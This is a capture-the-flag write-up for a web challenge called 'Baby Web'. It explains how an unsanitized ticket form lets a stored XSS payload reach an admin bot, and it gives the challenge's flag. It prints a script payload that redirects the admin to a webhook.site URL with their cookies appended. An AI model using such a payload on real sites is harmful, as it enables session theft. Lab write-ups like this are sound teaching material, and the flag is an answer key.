# Baby Web
Category: Web

## Description
This website seems to have an issue. Let's report it to the admins.

- Junhua

[http://34.124.157.94:5006/](http://34.124.157.94:5006/)

Attachments: [dist.zip](attachments/dist.zip)

## Write-up
- Upon inspecting the source code, we observed that it was a straightforward XSS challenge without any input sanitization measures in place.
- Our approach involved submitting a ticket located at the `/` endpoint with an XSS payload, thereby creating a ticket URL.
- Subsequently, the admin bot would access the ticket's URL and renders the ticket's message.
- To retrieve the flag cookie from admin, our payload needed to redirect the admin to our webhook URL while appending their cookie to it.
- Here is an example of what the ticket message should resemble:
```
<script>location.href = "https://webhook.site/774fac7f-86a1-4682-a2c0-883ea13d0a6a/?" + document.cookie</script>
```

Flag: `grey{b4by_x55_347cbd01cbc74d13054b20f55ea6a42c}`
